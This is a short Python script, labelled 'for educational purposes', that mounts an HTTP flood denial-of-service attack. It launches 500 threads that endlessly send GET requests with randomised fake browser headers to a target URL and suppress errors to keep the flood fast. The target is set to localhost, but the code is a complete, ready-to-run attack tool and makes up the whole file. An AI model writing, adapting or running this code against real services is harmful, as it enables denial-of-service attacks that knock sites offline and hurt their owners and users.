#!/usr/bin/python3
# -*- coding: utf-8 -*-
# More Aggressive DoS Script for Educational Purposes

import requests as r
import os
import threading
import random
from colorama import Fore, Style
from fake_headers import Headers

def clear(): 
    if os.name == 'nt': 
        os.system('cls') 
    else: 
        os.system('clear')

def logo():
    print(Fore.GREEN+"More Aggressive DoS Script for Educational Purposes"+Style.RESET_ALL)

def ddos(url):
    while True:
        headers = Headers(headers=True).generate()
        try:
            s = r.Session()
            s.get(url, headers=headers)  # Mengirim permintaan GET saja
        except:
            pass  # Tidak perlu mencetak kesalahan untuk mempercepat proses

def start_attack(url, num_threads):
    print(Fore.YELLOW+"Starting DoS attack with {} threads on {}".format(num_threads, url)+Style.RESET_ALL)

    for _ in range(num_threads):  
        thread = threading.Thread(target=ddos, args=(url,))
        thread.daemon = True  
        thread.start()

if __name__ == '__main__':
    clear()
    logo()
    target_url = "http://localhost:5000"  
    num_threads = 500  # Menambah jumlah thread
    start_attack(target_url, num_threads)
    input("Press Enter to stop the attack...")
